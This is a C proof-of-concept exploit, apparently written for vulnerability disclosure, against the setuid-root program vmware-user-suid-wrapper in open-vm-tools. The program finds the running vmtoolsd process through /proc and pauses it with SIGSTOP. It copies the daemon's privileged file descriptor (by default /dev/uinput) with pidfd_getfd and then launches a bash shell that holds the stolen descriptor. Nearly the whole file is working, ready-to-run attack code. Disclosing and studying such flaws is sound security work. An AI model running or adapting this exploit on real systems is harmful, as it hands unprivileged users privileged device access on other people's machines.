/*
 * Matthias Gerstner (matthias.gerstner@suse.de)
 *
 * 2023-07-24
 *
 * Proof of concept that shows a vulnerability in the setuid-root program
 * `vmware-user-suid-wrapper` which is part of the open-vm-tools project.
 *
 * The setuid-root program opens the following files using root privileges:
 *
 * - /dev/uinput
 * - /run/vmblock-fuse/dev
 *
 * then drops root privileges and executes the vmtoolsd daemon.
 *
 * On Linux this privilege drop means that other unprivileged processes owned
 * by the real UID of the process can now ptrace() vmtoolsd and perform other
 * privileged operations to obtain the already opened privileged files.
 *
 * This proof of concept obtains the desired file descriptor (specified as
 * command line argument, by default /dev/uinput) by using pidfd_getfd() on an
 * already running vmtoolsd. This works only if the system is a vmware guest
 * system and you are logged into a graphical environment where vmtoolsd
 * detects no errors and stays running.
 *
 * If this criteria is matched then this proof of concept will always succeed,
 * there is no race involved.
 */

#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#define VMTOOLSD "/usr/bin/vmtoolsd"

extern char **environ;
struct stat st;
char sbuf[1024];

/* system call wrappers since the pidfd family of functions does not yet have
 * wrappers in glibc */

int pidfd_open(pid_t pid) {
	return syscall(SYS_pidfd_open, pid, 0);
}

int pidfd_send_signal(int pidfd, int sig) {
	return syscall(SYS_pidfd_send_signal, pidfd, sig, NULL, 0);
}

int pidfd_getfd(int pidfd, int targetfd) {
	return syscall(SYS_pidfd_getfd, pidfd, targetfd);
}

// convert a string representing an integer to and int, returns operation success flag
bool stoint(const char *s, int *out) {
	int items = sscanf(s, "%d", out);

	return items > 0;
}

bool is_dir(int dir_fd, struct dirent *ent) {
	if (ent->d_type == DT_DIR) {
		return true;
	} else if (ent->d_type != DT_UNKNOWN) {
		return false;
	}

	if (fstatat(dir_fd, ent->d_name, &st, 0) != 0) {
		switch (errno) {
			case ENOENT: // race
			case EPERM: // not owned by us
			case EACCES:
				return false;
			default:
				perror("fstat(): /proc/<pid>");
				exit(1);
		}
	}

	return (st.st_mode & S_IFMT) == S_IFDIR;
}

void build_proc_exe_path(const char *pid) {
	int req = snprintf(sbuf, sizeof(sbuf), "/proc/%s/exe", pid);

	if (req < 0 || (size_t)req >= sizeof(sbuf)) {
		fprintf(stderr, "snprintf overflow\n");
		exit(1);
	}
}

/*
 * finds out the PID for the daemon running the executable defined in
 * `VMTOOLSD`. On error -1 is returned.
 */
pid_t find_daemon() {
	pid_t ret = -1;
	DIR *proc = opendir("/proc");
	struct dirent *ent = NULL;
	char target[PATH_MAX];

	if (!proc) {
		perror("opendir(): /proc");
		exit(1);
	}

	int proc_fd = dirfd(proc);

	while ((ent = readdir(proc)) != NULL) {
		if (!isdigit(ent->d_name[0]))
			continue;
		else if (!is_dir(proc_fd, ent))
			continue;

		build_proc_exe_path(ent->d_name);

		int written = readlink(sbuf, target, sizeof(target));

		if (written < 0 ) {
			switch (errno) {
				case EPERM: // not owned by us
				case EACCES:
					continue;
				default:
					break;
			}
			perror("readlink(): /proc/<pid>/exe");
		} else if ((size_t)written >= sizeof(target)) {
			fprintf(stderr, "readlink(): buffer truncation occured");
			exit(1);
		}

		target[written] = '\0';

		if (strcmp(target, VMTOOLSD) == 0) {
			if (!stoint(ent->d_name, &ret)) {
				perror("parsing vmblockd pid");
				exit(1);
			}
		}
	}

	closedir(proc);

	return ret;
}

/*
 * Returns the number of the file descriptor matching the given
 * `searched_path` in the daemon process running under PID `daemon_pid`
 * 
 * On error -1 is returned.
 */
int find_target_fd(int daemon_pid, const char *searched_path) {

	int req = snprintf(sbuf, sizeof(sbuf), "/proc/%d/fd", daemon_pid);

	if (req < 0 || (size_t)req >= sizeof(sbuf)) {
		fprintf(stderr, "snprintf overflow\n");
		exit(1);
	}

	struct dirent *ent = NULL;
	DIR *fd_dir = opendir(sbuf);

	if (!fd_dir) {
		perror("opendir(): /proc/<pid>/fd");
		return -1;
	}

	int fd_num = -1;
	int fd_dir_fd = dirfd(fd_dir);

	while ((ent = readdir(fd_dir)) != NULL) {
		if (!stoint(ent->d_name, &fd_num))
			continue;

		ssize_t len = readlinkat(fd_dir_fd, ent->d_name, sbuf, sizeof(sbuf));

		if (len < 0)
			continue;

		sbuf[len] = '\0';

		if (strcmp(sbuf, searched_path) == 0) {
			break;
		}
	}

	closedir(fd_dir);

	return fd_num;
}

/**
 * Performs the complete operational sequence of:
 *
 * - finding out the VMTOOLSD daemon's PID
 * - stopping the daemon to prevent further races
 * - finding the target file descriptor for the file specified on the command
 *   line
 * - duplicating this file descriptor from the VMTOOLS daemon
 * - resuming the daemon's operation
 *
 * returns the snatched fd or -1 if none could be obtained.
 **/
int try_snatch_fd(const char *snatch_fd_path) {
	pid_t daemon_pid = find_daemon();

	if (daemon_pid < 0) {
		printf("failed to find %s process\n", VMTOOLSD);
		return -1;
	} else {
		printf("%s running at %d\n", VMTOOLSD, daemon_pid);
	}

	int daemon_file = pidfd_open(daemon_pid);

	if (daemon_file < 0) {
		perror("pidfd_open(<vmtoolsd>)");
		return -1;
	}

	// stop the daemon so we can continue working with in peace without
	// fear of it meanwhile exiting
	pidfd_send_signal(daemon_pid, SIGSTOP);

	int daemon_fd_num = find_target_fd(daemon_pid, snatch_fd_path);

	int snatched_fd = -1;

	if (daemon_fd_num < 0) {
		fprintf(stderr, "failed to find fd to snatch (%s)", snatch_fd_path);
	} else {
		printf("Found fd %d for %s in %s\n", daemon_fd_num, snatch_fd_path, VMTOOLSD);
		snatched_fd = pidfd_getfd(daemon_file, daemon_fd_num);

		if (snatched_fd < 0) {
			perror("failed to snatch fd: pidfd_get_fd()");
		}
	}

	// let the daemon continue running
	pidfd_send_signal(daemon_pid, SIGCONT);

	close(daemon_file);

	return snatched_fd;
}

void run_subshell(int snatched_fd) {
	// reset the O_CLOEXEC flag, which is always set by pidfd_getfd.
	fcntl(snatched_fd, F_SETFD, 0);
	// execute new sub shell owning the snatched file descriptor
	printf("Executing sub shell which will inherit the snatched file descriptor %d (check /proc/self/fd)\n", snatched_fd);
	const char *argv[] = {"/bin/bash", NULL};
	execve("/bin/bash", (void*)argv, environ);
	perror("execve(bash)");
}

int main(int argc, const char **argv) {
	const char *snatch_fd_path = argc == 2 ? argv[1] : "/dev/uinput";

	int snatched_fd = try_snatch_fd(snatch_fd_path);

	if (snatched_fd < 0) {
		return 1;
	}

	run_subshell(snatched_fd);
	return 1;
}
